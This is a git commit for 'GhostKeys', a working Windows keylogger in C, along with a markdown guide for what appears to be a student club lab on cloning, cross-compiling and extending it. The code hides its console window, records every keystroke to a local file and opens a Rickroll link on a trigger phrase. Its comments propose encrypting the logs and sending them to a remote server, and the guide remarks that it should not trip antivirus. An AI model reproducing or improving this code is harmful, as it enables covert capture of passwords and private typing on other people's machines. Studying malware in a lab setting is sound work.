64e12900d950e268306bf096f4f5fe2789872ef6
Tomas Santos Yciano <tomassantos484@gmail.com>
2025-03-20 14:54:05 -0400

    Initial commit

---
+++ GhostKeys/GhostKeys.c
@@ -0,0 +1,92 @@
+#include <stdio.h>
+#include <windows.h>
+#include <string.h>
+
+#define TRIGGER_PHRASE "never gonna"
+#define URL "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+
+char buffer[100] = {0};
+
+void open_rickroll() {
+    ShellExecute(0, "open", URL, 0, 0, SW_SHOWNORMAL);
+}
+
+void logKey(int key, FILE* logfile);
+
+int main() {
+    FILE* logfile;
+    errno_t err = fopen_s(&logfile, "log.txt", "a+");
+    if (err != 0 || logfile == NULL) {
+        return 1; // Exit if file cannot be opened
+    }
+
+    // Hide the console window
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    // Initialize buffer for Rickroll detection
+    static int index = 0;
+    memset(buffer, 0, sizeof(buffer));
+
+    // While this method does work for key logging, its not very stealthy and could probably be improved a bit
+    while (1) {
+        for (int key = 8; key <= 255; key++) { // Loop through all possible key codes
+            if (GetAsyncKeyState(key) & 0x0001) { // Check if key is pressed
+                // Log the key
+                logKey(key, logfile);
+                
+                // Check for Rickroll trigger
+                if (key >= 32 && key <= 126) { // Only printable characters
+                    buffer[index++] = key;
+                    buffer[index] = '\0';
+                    
+                    if (strstr(buffer, TRIGGER_PHRASE)) {
+                        open_rickroll();
+                        index = 0;
+                        memset(buffer, 0, sizeof(buffer));
+                    }
+                    
+                    if (index >= sizeof(buffer) - 1) {
+                        index = 0;
+                        memset(buffer, 0, sizeof(buffer));
+                    }
+                }
+            }
+        }
+        Sleep(10); // Reduce CPU usage
+    }
+
+    fclose(logfile);
+    return 0;
+}
+
+// Function to log the keypress
+// There the way the logs are stored can be improved in multiple ways. Some ideas include:
+//     Some form of Encryption
+//     Time Stamps
+// These logs are also stored locally on the target machine. 
+// Another idea would be to transmit them back to a server somewhere...
+void logKey(int key, FILE* logfile) {
+    switch (key) {
+    case VK_BACK: fprintf(logfile, "[BACKSPACE]"); break;
+    case VK_RETURN: fprintf(logfile, "[ENTER]\n"); break;
+    case VK_SPACE: fprintf(logfile, " "); break;
+    case VK_TAB: fprintf(logfile, "[TAB]"); break;
+    case VK_SHIFT: fprintf(logfile, "[SHIFT]"); break;
+    case VK_CONTROL: fprintf(logfile, "[CTRL]"); break;
+    case VK_ESCAPE: fprintf(logfile, "[ESC]"); break;
+    case VK_LEFT: fprintf(logfile, "[LEFT]"); break;
+    case VK_RIGHT: fprintf(logfile, "[RIGHT]"); break;
+    case VK_UP: fprintf(logfile, "[UP]"); break;
+    case VK_DOWN: fprintf(logfile, "[DOWN]"); break;
+    case VK_DELETE: fprintf(logfile, "[DEL]"); break;
+    default:
+        if (key >= 32 && key <= 126) { // Printable ASCII characters
+            fprintf(logfile, "%c", key);
+        }
+        else {
+            fprintf(logfile, "[%d]", key); // Log other keys as keycodes
+        }
+        break;
+    }
+    fflush(logfile); // Flush to ensure data is written to the file
+}
---
+++ GhostKeys/Resume Project 2 Guide.md
@@ -0,0 +1,44 @@
+This guide is intended to be used alongside the live demo. It includes all the commands that will be run with brief explanations of what they each do. It also contains a very brief description of how the GhostKeys program works. 
+
+What you need for this lab:
+- A github account
+- VS-Code
+- A linux machine to develop on
+- A windows machine to test on
+
+For the two machines, it can be any combination of VMs or physical machines you want. For the live demo, Ill be developing on a Kali VM, and testing on a windows VM. You should be able to use any windows machine for testing. Due to the simplicity of this keylogger, it **SHOULDNT** set off anti-virus solutions (but it might. Who knows). 
+
+Commands Used: In order (All commands are on your linux machine)
+- Install VS Code
+	- `sudo apt install code-oss`
+- Install the MinGW toolchain
+	- `sudo apt install mingw-w64`
+- Clone the github repo
+	- `cd /opt`
+	- `sudo git clone https://github.com/SJUACM/GhostKeys.git`
+	- `cd GhostKeys`
+- Create a new branch
+	- `git checkout -b <new-branch-name>`
+		- Replace "`<new-branch-name>`" with whatever you want to name your branch
+- Open the repo in VS Code
+	- `sudo code-oss .`
+- Compile the code
+	- `sudo x86_64-w64-mingw32-gcc GhostKeys.c -o GhostKeys.exe -mwindows`
+	- Make sure that you do not try to submit a compiled EXE in your pull request. 
+- Commit Changes
+	- `git add <changed files>`
+		- Replace `<changed files>` with the names of any files you made changes to
+	- `git commit -m "commit message"`
+		- Replace `commit message` with a short message (about 1 sentance) describing your changes
+- Push Changes to github
+	- `git push origin <branch name>`
+		- Replace `<branch name>` with the name of your branch
+
+After youve pushed your changes, in order to submit a pull request, open the GhostKeys repo on github. 
+- Go to the "Pull Requests" tab and click "New Pull Request"
+- Select the branch you pushed. Here youll be able to compare it to the main branch and see all the changes you made. 
+- Click "Create Pull Request"
+- Add a description of what you changed. 
+- Click Submit.
+
+If all goes well and the creator likes what you did, they will approve your request and merge it into the main branch.
